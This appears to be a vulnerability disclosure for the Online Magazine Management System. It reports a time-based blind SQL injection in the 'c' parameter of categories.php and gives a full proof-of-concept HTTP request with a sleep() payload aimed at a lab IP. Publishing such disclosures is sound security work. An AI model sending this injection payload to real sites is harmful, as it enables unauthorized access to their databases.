# Online Magazine Management System SQL blind injection(SQLI)

## Description

    In categories.php, parameter c is not filtered and directly connected to the SQL statement, causing SQL injection

## Affects Plugins

    Online Magazine Management System
    https://www.sourcecodester.com/php/15061/online-magazine-management-system-php-free-source-code.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

sink

| ![image-20250910161139868](https://raw.githubusercontent.com/0xffaaa/cve/refs/heads/main/Online%20Magazine%20Management%20System%20SQL%20blind%20injection(SQLI).assets/image-20250910161139868.png) |
| ------------------------------------------------------------ |

POC

```php
GET /magazines/index.php?page=categories&c=1'or+sleep(1)%23 HTTP/1.1
Host: 10.211.55.3
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hnqeqgpe4vminlft80be2vrcej
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="92", "Google Chrome";v="92"
sec-ch-ua-mobile: ?0
Connection: keep-alive


```

Vulnerability verification

| ![image-20250910161224585]([Online Magazine Management System SQL blind injection(SQLI).assets](https://raw.githubusercontent.com/0xffaaa/cve/refs/heads/main/Online%20Magazine%20Management%20System%20SQL%20blind%20injection(SQLI).assets/image-20250910161224585.png) |
| ------------------------------------------------------------ |

Normal request

| ![image-20250910161308506]([Online Magazine Management System SQL blind injection(SQLI).assets/](https://raw.githubusercontent.com/0xffaaa/cve/refs/heads/main/Online%20Magazine%20Management%20System%20SQL%20blind%20injection(SQLI).assets/image-20250910161308506.png) |
| ------------------------------------------------------------ |

